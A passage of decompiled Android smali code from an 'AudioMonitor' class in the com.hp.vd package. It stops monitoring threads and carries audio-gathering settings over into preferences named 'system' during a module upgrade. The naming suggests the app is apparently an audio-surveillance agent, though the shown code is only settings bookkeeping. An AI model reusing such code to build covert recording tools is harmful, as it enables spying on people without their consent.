    iget-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 408
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->initialAudioListerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    .line 409
    iget-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->initialAudioListerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_2
    const/4 v0, 0x0

    .line 412
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->monitoringStatus:Z

    const/4 v0, 0x1

    return v0
.end method

.method public update(Lcom/hp/vd/module/IModule;)Z
    .locals 6

    .line 117
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    if-eqz v0, :cond_0

    const-string v1, "AudioMonitor"

    const-string v2, "update() called on the new version. About to temporarily save important attributes."

    .line 120
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_0
    const/4 v1, 0x3

    const/4 v2, 0x0

    .line 136
    :try_start_0
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object p1
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    if-nez p1, :cond_2

    if-eqz v0, :cond_1

    const-string p1, "AudioMonitor"

    const-string v3, "The loaded persistedModuleData from the old module == NULL."

    .line 152
    invoke-interface {v0, p1, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_1
    return v2

    :cond_2
    const-string v1, "max_internal_audio_id"

    .line 162
    invoke-virtual {p1, v1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v3, "gather_audio_on_start"

    .line 163
    invoke-virtual {p1, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 169
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "system"

    .line 171
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v5

    invoke-virtual {v5}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 169
    invoke-virtual {v3, v4, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 174
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    if-eqz v1, :cond_3

    const-string v3, "audio_max_internal_audio_id"

    .line 177
    invoke-interface {v2, v3, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    if-eqz v0, :cond_3

    const-string v3, "AudioMonitor"

    .line 180
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "update(): from the previous module: audio_CUSTOM_ATTRIB_MAX_ID: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_3
    if-eqz p1, :cond_4

    const-string v1, "audio_gather_audio_on_start"

    .line 185
    invoke-interface {v2, v1, p1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    if-eqz v0, :cond_4

    const-string v1, "AudioMonitor"

    .line 188
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "update(): from the previous module: audio_CUSTOM_ATTRIB_LIST_ON_START: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 192
    :cond_4
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result p1

    return p1

    :catch_0
    if-eqz v0, :cond_5

    const-string p1, "AudioMonitor"

    const-string v3, "Could not load the persistedModuleData from the old module we are currently upgrading."

    .line 140
    invoke-interface {v0, p1, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_5
    return v2
.end method
